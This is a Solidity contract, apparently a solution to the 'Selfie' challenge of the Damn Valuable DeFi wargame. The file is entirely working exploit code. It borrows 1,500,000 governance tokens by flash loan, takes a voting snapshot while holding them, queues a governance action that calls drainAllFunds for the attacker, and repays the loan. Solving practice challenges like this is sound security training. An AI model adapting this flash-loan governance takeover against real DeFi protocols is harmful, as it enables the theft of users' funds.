pragma solidity ^0.8.0;

import "../selfie/SelfiePool.sol";
import "../selfie/SimpleGovernance.sol";
import "../DamnValuableTokenSnapshot.sol";

contract SelfieAttack {

  DamnValuableTokenSnapshot public immutable token;
  SelfiePool public immutable pool;
  SimpleGovernance public immutable governance;
  address public immutable owner;
  uint256 public actionId;

  constructor(address _token, address _pool, address _governance) {
    token = DamnValuableTokenSnapshot(_token);
    pool = SelfiePool(_pool);
    governance = SimpleGovernance(_governance);
    owner = msg.sender;
  }

  function attack() external {
    pool.flashLoan(1500000 ether);
  }

  function receiveTokens(address _token, uint256 _amount) external {
    token.snapshot();
    actionId = governance.queueAction(
      address(pool),
      abi.encodeWithSignature("drainAllFunds(address)", owner), 
      0
    );
    DamnValuableTokenSnapshot(_token).transfer(msg.sender, _amount);
  }
}